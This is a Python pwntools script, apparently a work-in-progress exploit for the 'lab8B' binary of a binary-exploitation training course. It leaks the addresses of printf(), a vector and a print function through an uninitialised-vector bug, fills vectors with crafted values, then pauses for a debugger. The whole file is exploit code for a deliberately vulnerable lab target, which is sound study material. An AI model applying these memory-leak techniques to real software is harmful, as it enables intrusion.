# Based on https://github.com/ewilded/MBE-snippets/blob/master/LAB7C/exploit.py
from pwn import *

settings = {
    # Path to binary
    "binary"        : "./lab8B",
}
# Exploit here
def exploit():
    # Available variables
    # p      => Tubes! (http://docs.pwntools.com/en/stable/tubes.html)
    # binary => ELF of binary
	
	# We start with printing the first vector without initializing it with anything, this will leak the printf() address:
    p.sendlineafter("I COMMAND YOU TO ENTER YOUR COMMAND: ","3")
    p.sendlineafter("Which vector? ","1")
    leak = p.recv()
    printf_addr = u32(leak[0x0:0x4])
    print("Leaked printf() address: ",hex(printf_addr))
	
    # Now we initiate the vector 1 with data, then we will print it. This way we will leak the printVector() address.
    # For now we initiate it with test data (1,2,3):
    p.sendline("1") # Action
    p.sendline("1") # Vector number
    p.sendline(p8(0x1)) # 1, this has to go as literal, because the type here is char read by getchar()
    p.sendline("2") # These are sent as strings, although we mean numbers, they are read by scanf().
    p.sendline("3") #
    p.sendline("4") # 
    p.sendline("5") #
    p.sendline("6")
    p.sendline("7")
    p.sendline("8")
    p.sendline("9")
    p.recv()		# Flush the output buffer

    # Now, we create the second vector (also with test data, the goal is to have 0x41 in sum's bytes (v3))
    p.sendline("1") # Action
    p.sendline("2") # Vector number
    p.sendline("@") # 1, this has to go as literal, because the type here is char read by getchar()
    p.sendline("16448") # These are sent as strings, although we mean numbers, they are read by scanf().
    p.sendline("16448") # 2 shorts (signed and unsigned).
    p.sendline("1077952576") # 4 ints (sizeof of int and long it is 4 bytes in this case, hence they're all the same)
    p.sendline("1077952576") # signed and unsigned int
    p.sendline("1077952576") # same for longs
    p.sendline("1077952576") # 
    p.sendline("4629771061636907072")	# these are signed and unsigned long longs (64 bits, 8 bytes)
    p.sendline("4629771061636907072")	#
	
    # Now we sum them up
    p.sendlineafter("I COMMAND YOU TO ENTER YOUR COMMAND: ","2")
	
	# Now let's print the second vector to see it as well as to leak the printFunc address (we can't print the sum vector unless we load it into a fav and then either print favs or load it from a fav to one of those vectors).
    p.sendlineafter("I COMMAND YOU TO ENTER YOUR COMMAND: ","3")
    p.sendlineafter("Which vector? ","2")
    v1_addr = int(p.recvline().split(" ")[1].strip(),16)
    print_vector_addr = int(p.recvline().split(" ")[2].strip(),16)
    print("Leaked v1() address: ",hex(v1_addr))
    print("Leaked printFunc() address: ",hex(print_vector_addr))
    # OK, let's attach gdb here
    print("PID: "+str(pidof(p)))
    pause()
    p.interactive()
    #p.sendline("0") # quit
    #p.recv()
    return 0

# Initial setup
if __name__  == "__main__":
	
    binary = ELF(settings['binary'])
    context.log_level = 'debug'
    p = process(binary.path,stdin=PTY)
    exploit()